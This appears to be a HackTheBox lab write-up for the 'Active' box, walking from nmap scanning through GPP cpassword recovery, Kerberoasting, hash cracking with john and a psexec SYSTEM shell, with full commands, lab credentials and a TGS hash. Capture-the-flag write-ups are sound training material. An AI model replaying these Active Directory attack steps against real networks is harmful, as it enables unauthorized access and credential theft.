---
description: Active box from HackTheBox write up.
---

# Active

## Nmap

According with the Nmap scan, this is an Active Directory box.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate=1000 10.10.10.100
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 13:23 CET
Nmap scan report for 10.10.10.100
Host is up (0.047s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
49168/tcp open  unknown
49169/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 39.26 seconds

┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 10.10.10.100
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 13:26 CET
Nmap scan report for 10.10.10.100
Host is up (0.045s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-31 12:26:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-01-31T12:27:18
|_  start_date: 2023-01-30T19:18:42

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.24 seconds
```

Time to enumerate a bit the domain and see what we can find.

## Active Directory policies

Using enum4linux and smbclient I found that there is a share called: `Replication` that I can read without credentials. Looking arount it I got the file `Groups.xml `:

```
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 22:46:06 2018

		5217023 blocks of size 4096. 277179 blocks available
```

This file contains a group policy that basically creates a user with the name `SVC_TGS`. The password is there too in an encoded format.

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

```

The password can be easily recovered using `gpp-decrypt`, so now we have valid credentials for what looks like a valid account in the domain.

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Active]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

The only problem is that we cannot really get access to the machine yet. Powershell remoting is not enabled and the user is not administrator so Psexec trick won't work neither. 

For now, we could get the user flag through the `Users` share but not much more...

## Pwned!

Well, looks like we can actually do something. I decided to see if Kerberoasting was an option and looks like the SMB service is running using a normal user account.

```bash
┌──(kali㉿kali)-[~]
└─$ crackmapexec ldap active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --kerberoasting KERBEROASTING
SMB         active.htb      445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
LDAP        active.htb      389    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
LDAP        active.htb      389    DC               [*] Total of records returned 4
CRITICAL:impacket:CCache file is not found. Skipping...
LDAP        active.htb      389    DC               sAMAccountName: Administrator memberOf: CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb pwdLastSet: 2018-07-18 21:06:40.351723 lastLogon:2023-01-30 20:19:43.216140
LDAP        active.htb      389    DC               $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$229e62ef990e89d48a31c5742e534fc9$24f56e360c22ce0039da8df720555ba45f225944abd08ce3d6734df1c238d2a1254464592c74d961bec86a09ec798c7cb26f4237c337be668f8d8629ab9114cdb0e58431d233692d242335b8a0be9ffb8d2222ae164e3536d1681f27e181a116133b8956e0467a62aca3f282a4fe742ec0478002a89766df0f976be6b7a42c832ed9ed1e587bb93e4f3c800ce9cc706010d18d6395c640a27547e050de0363fc7c333c5a60a12422f56539d1d6ba200f8d889dc43927787fad2017ea0473daa84ec1bb0bce87fd28ae010dc96cde6b9f12a5a887f28091b0822aea9a90c78b4c6c73092b7b41f4008d043c5860b82cd478f07407577f214403414388e87dadf15ed365282b4421114c7e0a4ea0388d0c8cab6805ec83d33d55b10b258d206eea9b9161a6547ed63462d0568ca4343677dfdf2916a0999f4d449514a41a9a4ad6f9cb2c266eff43953403cd968725968d0734222fe9e9780d986863ae9958fc0d72892172c4c529410db6cb4d14b6637a76fabb79486b806770cbf2ce370b4cdc3cf91e0ea2a75a825d2e83dd6a212e282cb4e33667e36f1149bc8dc6c40654bdace02da06f4e0c3ffc80531a09538d8e22d2745ee20616918cf5cf61dc80c2f8b6970fa2119e8efae9d10fe2b2af3fb0a3124beef8fa51c6f24ae5de8f2cf030e7322bb9aae5a1fbf146c6affe30783011c7bdf5737b45fab69c99459dcade8b1e503a87973404c816cdf5768940a06a3897e8849674bfe8cb360219e79ada9b680a67c23e2bb3175a7f626c96c369a3170b6f98f2e48a65c3976c9819825701447f956668b3a3540acc89c43aa7888e43b8429cb8fb6e1a1916e990c5294d4864bfe33e9fc08e5bf24e83cec45767821de59d903b900522de4d9ac6669cd75860ba52caea7dfe0cf747e35c04d461ebf98090a7f21439d1f68f2c52b23adaa0d647d48a90211ef3cacdc6dec1ba08762b3db5c3aecbf3d6164af2daa49b1e434c7a908b1e0aaa251d9a90cafb595226e91ac673cec3d76b615765849b7966fe7f04fdebc8c7939955ed317c72baa5432c0e8ac58f627e7f944e816ea5bf2e64d89c2a8c5b3ead9d064c11b9a6aa563043d32bad037ca2f962e241cadc2c80caa4621892c8c62224dc4f8ff65199af37ae50467ee36e73b3bcf6608cbfc6c4bb6ff673bc76f7bb3e03d280f8db9b7adcf2cb9b5deb599bd9401cee79e0101329db320138c14598b89a6ddf2c1683c94199dc92a0000706d14897
```

Once with the TGS collected, I tried to crack it using the Rockyou dictionary. After a bit the service password was found.

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Active]
└─$ john --wordlist=~/Wordlists/rockyou.txt hashes                                                    
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:03 DONE (2023-01-31 14:23) 0.3021g/s 3183Kp/s 3183Kc/s 3183KC/s Tiffani1432..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Since now we hace an account with administrator privileges, we can use Psexec and get access to the machine!

```bash
┌──(kali㉿kali)-[~]
└─$ impacket-psexec active.htb/Administrator:Ticketmaster1968@active.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on active.htb.....
[*] Found writable share ADMIN$
[*] Uploading file oHEvJISy.exe
[*] Opening SVCManager on active.htb.....
[*] Creating service MEaL on active.htb.....
[*] Starting service MEaL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```
